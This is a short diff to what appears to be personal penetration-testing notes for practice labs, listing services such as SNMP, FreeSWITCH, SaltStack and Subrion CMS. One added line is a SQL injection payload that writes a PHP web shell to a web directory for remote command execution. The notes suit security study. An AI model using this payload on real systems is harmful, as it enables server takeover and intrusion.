@@ -45,8 +45,8 @@
 - random ports(3003,3000)
 - snmp 161 --> credentials
 - FreeSWITCH mod_event_socket
-
--
+- ' union select '<?php echo system($_REQUEST["bingo"]); ?>' into outfile '/srv/http/cmd.php' -- -
+- Check the html title for service name!!!!
 
 - Saltstack (PG-Prac Twiggy)
 - Subrion CMS v4.2.1(PG-Prac Exfiltrated)
